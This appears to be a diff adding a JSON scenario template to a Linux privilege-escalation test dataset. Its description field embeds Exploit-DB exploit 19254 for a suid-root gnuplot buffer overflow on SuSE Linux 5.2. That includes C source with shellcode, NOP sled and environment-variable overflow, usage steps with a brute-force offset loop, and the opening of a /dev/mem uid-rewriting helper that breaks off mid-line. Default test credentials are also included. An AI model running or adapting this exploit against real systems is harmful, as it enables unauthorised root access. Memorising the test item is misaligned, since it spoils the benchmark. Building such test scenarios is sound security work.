@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19254",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: S.u.S.E Linux 5.2 - 'gnuplot' Local Overflow / Local Privilege Escalation (CVE-1999-0409;OSVDB-973)\n\nExploit source code (19254.c):\n```\n/*\nsource: https://www.securityfocus.com/bid/319/info\n\nLinux gnuplot 3.5 is shipped with S.u.S.E. Linux 5.2 and installed suid root by default. There is a buffer overflow vulnerability present in gnuplot which allows for users to obtain root access locally.\n*/\n\n/*\n\ngnuplot Linux x86 exploit from xnec\n\ntested on gnuplot Linux version 3.5 (pre 3.6) patchlevel beta 336/SuSE 5.2\n\ngnuplot ships suidroot by default in SuSE 5.2, maybe others\n\ngcc -o xnec_plot xnec_plot.c\n\n./xnec_plot <bufsiz> <offset>\n\nThe buffer we're overflowing is only 80 bytes, so we're going to have to\n\nget our settings just so. If you don't feel like typing in command line\n\noffsets and bufsizes, make a little shell script: --- #! /bin/bash\n\nbufsiz=110\n\noffset=0\n\nwhile [ $offset -lt 500 ]; do\n\n./xnec_plot $bufsiz $offset\n\noffset=`expr $offset + 10`\n\ndone --- since gnuplot drops root privs after it inits your svga, we can't just exec\n\n/bin/sh, we'll need to use the technique of replacing our saved uid\n\nin /dev/mem with '0', then execing whatever we please. We do this by compiling\n\nNergal's program, mem.c and putting the output file in /tmp/xp, as in\n\ngcc -o /tmp/xp mem.c. Nergal's program will then make /tmp/sh suidroot,\n\nso don't forget to cp /bin/sh /tmp/sh. You will also have to change\n\nline 32 to the correct address of kstat, which can be obtained by doing\n\nstrings /proc/ksyms | grep kstat.\n\nSince I can see absolutely no reason for gnuplot to be suidroot, the bestfix is chmod -s /usr/bin/gnuplot.\n\ngreets to #sk1llz, xnec on EFnet and DALnet\n\n*/\n\n#include <stdlib.h>\n\n#define DEFAULT_OFFSET 50\n\n#define DEFAULT_BUFSIZ 110\n\n#define NOP 0x90\n\n#define DEFAULT_ADDR 0xbffff81c\n\n/* Aleph One's shellcode, modified to run our own program */\n\nchar shellcode[] =\n\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n\n\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n\n\"\\x80\\xe8\\xdc\\xff\\xff\\xff/tmp/xp\";\n\nunsigned long getsp(void) {\n\n__asm__(\"movl %esp,%eax\");\n\n}\n\nvoid main(int argc, char *argv[]) {\n\nchar *buf, *ret;\n\nlong *addrp, addr;\n\nint bufsiz, offset;\n\nint i;\n\nbufsiz=DEFAULT_BUFSIZ;\n\noffset=DEFAULT_OFFSET;\n\nif (argc = 2) bufsiz = atoi(argv[1]);\n\nif (argc = 3) offset = atoi(argv[2]);\n\nbuf=malloc(bufsiz);\n\naddr = getsp() - offset;\n\nprintf(\"address: 0x%x\\n\", addr);\n\nprintf(\"bufsize: %d\\n\", bufsiz);\n\nprintf(\"offset : %d\\n\", offset);\n\nret = buf;\n\naddrp = (long *) ret;\n\nfor (i = 0; i < bufsiz; i+=4)\n\n*(addrp++) = addr;\n\nmemset(buf, NOP, (strlen(shellcode)/2));\n\nret = buf + ((bufsiz/2) - (strlen(shellcode)/2));\n\nfor (i = 0; i < strlen(shellcode); i++)\n\n*(ret++) = shellcode[i];\n\nbuf[bufsiz - 1] = '\\0';\n\nmemcpy(buf,\"HOME=\", 5);\n\nsetenv(\"HOME\", buf, 1);\n\nexecvp(\"/usr/bin/gnuplot\", NULL);\n\n} ---snip---\n\nmem.c\n\n---snip---\n\n/* by Nergal */\n\n#define SEEK_SET 0\n\n#define __KERNEL__\n\n#include <linux/sched.h>\n\n#undef __KERNEL__\n\n#define SIZEOF sizeof(struct task_struct)\n\nint mem_fd;\n\nint mypid;\n\nvoid\n\ntesttask (unsigned int mem_offset)\n\n{\n\nstruct task_struct some_task;\n\nint ui\n```",
+  "cve": "CVE-1999-0409;OSVDB-973",
+  "exploitdb_id": "19254",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19254",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
